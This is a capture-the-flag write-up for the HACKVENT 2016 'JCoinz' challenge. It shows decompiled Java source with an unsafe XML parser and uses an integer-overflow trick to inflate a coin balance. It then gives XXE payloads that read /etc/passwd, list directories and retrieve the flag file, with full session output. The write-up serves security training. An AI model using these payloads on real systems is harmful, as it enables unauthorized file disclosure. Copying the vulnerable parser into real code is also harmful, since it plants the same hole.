---
layout: writeup
title: 'Dec 13: JCoinz'
level:
difficulty:
points:
categories: []
tags: []
flag: HV16-y4h0-g00t-d33m-c01n-zzzz

---

## Challenge

*Sometimes less is more*

The manager of jcoinz told a developer to implement a transaction tax as
fast as possible so he can earn more money. Maybe that was a wrong
decision...

`nc challenges.hackvent.hacking-lab.com 3117`

[jcoinz.jar](writeupfiles/jcoinz.jar)

## Solution

We start by decompiling the jar file to get the [source
files](writeupfiles/jcoinz_source).

Account.java:

    public class Account {
        private String name;
        private int coins;

        public String getName() {
            return this.name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getCoins() {
            return this.coins;
        }

        public void setCoins(int coins) {
            this.coins = coins;
        }

        public boolean payCoins(int amount) {
            int decreasedCoins;
            if (this.getCoins() <= 0) {
                IO.printStatus("-", "No more jcoinz!\n\n");
                return false;
            }
            if (amount < 0) {
                amount *= -1;
            }
            if ((decreasedCoins = this.getCoins() - amount - Shop.transactionTax) < 0) {
                IO.printStatus("-", "You cannot generate debts!\n\n");
                return false;
            }
            this.setCoins(decreasedCoins);
            IO.printStatus("-", "Decreased the account of \"" + this.getName() + "\" by " + String.valueOf(amount) + "\n");
            return true;
        }

        public Account(String name, int coins) {
            this.name = name;
            this.coins = coins;
        }
    }
{: .language-java}

IO.java

    import java.io.InputStream;
    import java.io.PrintStream;
    import java.util.Scanner;

    public class IO {
        public static void printStatus(String status, String message) {
            System.out.print("[" + status + "] " + message);
        }

        public static Scanner getUserInput(String question) {
            IO.printStatus("?", question);
            return new Scanner(System.in);
        }
    }
{: .language-java}

Shop.java

    import javax.xml.transform.Source;
    import javax.xml.transform.Transformer;
    import javax.xml.transform.TransformerConfigurationException;
    import javax.xml.transform.TransformerException;
    import javax.xml.transform.TransformerFactory;
    import javax.xml.transform.dom.DOMSource;
    import javax.xml.transform.stream.StreamResult;
    import org.w3c.dom.Document;
    import org.w3c.dom.Node;
    import org.xml.sax.SAXException;

    public class Shop {
        public static int transactionTax = 2;

        public static void sendToAdmin(Account acc) {
            if (acc.payCoins(1337)) {
                String secretMessage = IO.getUserInput("XML Message: ").nextLine();
                DocumentBuilderFactory xmlDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
                DocumentBuilder xmlDocumentBuilder = null;
                Document xmlDocument = null;
                try {
                    xmlDocumentBuilder = xmlDocumentBuilderFactory.newDocumentBuilder();
                }
                catch (ParserConfigurationException e) {
                    e.printStackTrace();
                }
                try {
                    xmlDocument = xmlDocumentBuilder.parse(new ByteArrayInputStream(secretMessage.getBytes()));
                }
                catch (SAXException e) {
                    e.printStackTrace();
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
                TransformerFactory xmlTransformerFactory = TransformerFactory.newInstance();
                Transformer xmlTransformer = null;
                try {
                    xmlTransformer = xmlTransformerFactory.newTransformer();
                }
                catch (TransformerConfigurationException e1) {
                    e1.printStackTrace();
                }
                xmlTransformer.setOutputProperty("omit-xml-declaration", "yes");
                StringWriter xmlWriter = new StringWriter();
                try {
                    xmlTransformer.transform(new DOMSource(xmlDocument), new StreamResult(xmlWriter));
                }
                catch (TransformerException e) {
                    e.printStackTrace();
                }
                IO.printStatus("+", "Your secret xml message: " + xmlWriter.getBuffer().toString() + "\n\n");
            }
        }

        public static void sendToCharity(Account acc) {
            if (acc.payCoins(IO.getUserInput("Amount of jcoinz to send: ").nextInt())) {
                IO.printStatus("+", "Thank you very much!\n\n");
            }
        }
    }
{: .language-java}

MainRunner.java

    import java.io.PrintStream;

    public class MainRunner {
        public static void showWelcome() {
            System.out.println("$$$$$$$$$$$$$$$$$$\n$ JCOINZ SERVICE $\n$$$$$$$$$$$$$$$$$$\n");
        }

        public static void showMenu(Account acc) {
            System.out.println("1 - sends jcoinz to charity\n2 - send a secret xml message to the admin \nYour name: " + acc.getName() + "\n" + "Your amount of jcoinz: " + String.valueOf(acc.getCoins()) + "\n");
        }

        /*
         * Exception decompiling
         */
        public static void main(String[] args) {
            // This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
            // org.benf.cfr.reader.util.CannotPerformDecode: reachable test BLOCK was exited and re-entered.
            // org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.Misc.getFarthestReachableInRange(Misc.java:143)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.examineSwitchContiguity(SwitchReplacer.java:385)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.replaceRawSwitches(SwitchReplacer.java:65)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:423)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:217)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:162)
            // org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:95)
            // org.benf.cfr.reader.entities.Method.analyse(Method.java:355)
            // org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:768)
            // org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:700)
            // org.benf.cfr.reader.Main.doJar(Main.java:134)
            // org.benf.cfr.reader.Main.main(Main.java:189)
            throw new IllegalStateException("Decompilation failed");
        }
    }
{: .language-java}

We start with `1336` coins, and need `1337` in order to write an XML
message to the admin (and
presumably exploit that to find the nugget), but we can only give away
coins, not add them..

The hint is `Sometimes less is more` ..so we think integer overflow;
subtract so much we get
positive integer again. For instance, we know that
`System.out.println(-1 - Integer.MIN_VALUE)`
gives as output `2147483647`. This is what we aim for, there are,
however, a few limitations:

1.  If a negative number is entered, it is multiplied by -1
2.  A tax is added to every transaction, 2 more coins than what you give
    away are subtracted from your total
3.  If the result of the transaction would be a negative balance, it is
    not processed

First, note that `-1*Integer.MIN_VALUE` is still `Integer.MIN_VALUE` so
this circumvents the first limitation.

The tax will actually help us to get this done. As the result of our
transactions can not be negative,
we cannot get a balance of -1, which is what we would like so that we
can subtract `INT_MIN`, but, if
we first get our balance down to +1, then the tax will get us to -1
after which our value will be
subtracted, and then we're rich!

So we can do this in two transactions, first give away `1333` coins, and
then we give away
`Integer.INT_MIN` (`-2147483648`) coins, which with the added tax will
give us the integer
overflow we want.

    nc challenges.hackvent.hacking-lab.com 3117

    $$$$$$$$$$$$$$$$$$
    $ JCOINZ SERVICE $
    $$$$$$$$$$$$$$$$$$

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 1336

    [?] Action: 1
    [?] Amount of jcoinz to send: 1333
    [-] Decreased the account of "billy" by 1333
    [+] Thank you very much!

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 1

    [?] Action: 1
    [?] Amount of jcoinz to send: -2147483648
    [-] Decreased the account of "billy" by -2147483648
    [+] Thank you very much!

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147483647

Now we have enough coins to send an XML message! Now we need to figure
out how to
abuse this to read the flag from the server..

From Wikipedia entry on XXE exploits:
`https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing` :

    <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
       <!ELEMENT foo ANY >
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

to show contents of `/etc/passwd/`. Since we don't know which file we
need, we can adapt it to list contents of
base directory

    # list files in root directory
    <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///" >]><foo>&xxe;</foo>

Yes! this works:

    $ java -jar jcoinz.jar
    $$$$$$$$$$$$$$$$$$
    $ JCOINZ SERVICE $
    $$$$$$$$$$$$$$$$$$

    [..]

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147482308

    [?] Action: 2
    [-] Decreased the account of "billy" by 1337
    [?] XML Message: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///" >]><foo>&xxe;</foo>
    [+] Your secret xml message: <foo>.rpmdb
    bin
    boot
    cdrom
    dev
    etc
    export
    home
    initrd.img
    initrd.img.old
    lib
    lib32
    lib64
    lost+found
    media
    mnt
    opt
    proc
    root
    run
    sbin
    snap
    srv
    sys
    tmp
    usr
    var
    vmlinuz
    vmlinuz.old
    </foo>

So we check in the `home` folder, and by repeatedly sending xml messages
we eventually find a file in
`/home/jcoinz` that contains the flag:

    $ nc challenges.hackvent.hacking-lab.com 3117
    $$$$$$$$$$$$$$$$$$
    $ JCOINZ SERVICE $
    $$$$$$$$$$$$$$$$$$

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 1336

    [?] Action: 1
    [?] Amount of jcoinz to send: 1333
    [-] Decreased the account of "billy" by 1333
    [+] Thank you very much!

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 1

    [?] Action: 1
    [?] Amount of jcoinz to send: -2147483648
    [-] Decreased the account of "billy" by -2147483648
    [+] Thank you very much!

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147483647

    [?] Action: 2
    [-] Decreased the account of "billy" by 1337
    [?] XML Message: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///home" >]><foo>&xxe;</foo>
    [+] Your secret xml message: <foo>jcoinz
    </foo>

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147480969

    [?] Action: 2
    [-] Decreased the account of "billy" by 1337
    [?] XML Message: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///home/jcoinz" >]><foo>&xxe;</foo>
    [+] Your secret xml message: <foo>9f40461baba9bf00ba9174beeeb9b8a80c0ffba6
    jcoinz.jar
    </foo>

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147479630

    [?] Action: 2
    [-] Decreased the account of "billy" by 1337
    [?] XML Message: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///home/jcoinz/9f40461baba9bf00ba9174beeeb9b8a80c0ffba6" >]><foo>&xxe;</foo>
    [+] Your secret xml message: <foo>
    You did it!

    Greets, MuffinX

    HV16-y4h0-g00t-d33m-c01n-zzzz

    If you liked this challenge, tweet me: https://twitter.com/muffiniks
    </foo>

    1 - sends jcoinz to charity
    2 - send a secret xml message to the admin
    Your name: billy
    Your amount of jcoinz: 2147478291

    [?] Action:


